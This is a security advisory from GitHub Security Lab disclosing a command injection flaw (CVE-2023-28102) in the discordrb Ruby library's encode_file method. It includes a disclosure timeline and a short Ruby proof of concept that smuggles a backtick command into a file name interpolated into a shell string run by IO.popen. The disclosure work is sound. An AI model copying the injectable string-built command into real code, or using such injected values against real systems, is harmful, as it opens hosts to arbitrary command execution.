# GHSL-2022-094: Remote Code Execution in discordrb - CVE-2023-28102

[![Author avatar](https://avatars.githubusercontent.com/u/61799930)
Erik Krogh Kristensen](https://github.com/ghsecuritylab)

## Coordinated Disclosure Timeline

* 2022-12-27: Contacted maintainer over Discord about vulnerability, maintainer says will fix.
* 2023-03-09: Vulnerability fixed and Code Scanning Added to Repo
* 2023-03-15: Vulnerability assigned CVE-2023-28102

## Summary

The `encode_file` method may lead to remote code execution if invoked with untrusted user-controlled data.

## Product

discordrb

## Tested Version

3.4.1 (latest)

## Details

### Issue: Unsafe construction of shell command in `encode_file` (`GHSL-2022-094`)

The [`encoder.rb`](https://github.com/shardlab/discordrb/blob/1cd5603d23e0a329e10b46446a09f2a71cbb9f3b/lib/discordrb/voice/encoder.rb#L79-L80) file unsafely constructs a shell string using the `file` parameter, which can potentially leave clients of discordrb vulnerable to command injection.

The library is not directly exploitable: the exploit requires that some client of the library calls the vulnerable method with user input. However, if unsafe input reaches the library method, then an attacker can execute arbitrary shell commands on the host machine.
Here is the [CodeQL result](https://gist.github.com/erik-krogh/5d8d5cbc9c776b21367a0e36b3d5c550).

#### Proof of Concept

Here is a PoC (relevant code copy-pasted into the PoC for ease of setup).

The observed effect should be that a new file `pwned` is created in the current working directory.

```
## This is how the PoC would be if you setup discordrb.
# require 'discordrb'
# bot = Discordrb::Voice::Encoder.new
# bot.encode_file(`touch pwned`)

ffmpeg_command = "foo" # unrelated
options = "" # unrelated
filter_volume_argument = "bar" # unrelated

# Command that will be executed
file = "`touch pwned`"

# This command should be build as an array instead of a string, that way injection would be impossible!
command = "#{ffmpeg_command} -loglevel 0 -i \"#{file}\" #{options} -f s16le -ar 48000 -ac 2 #{filter_volume_argument} pipe:1"
IO.popen(command)

```
#### Impact

This issue may lead to Remote Command Execution (RCE).
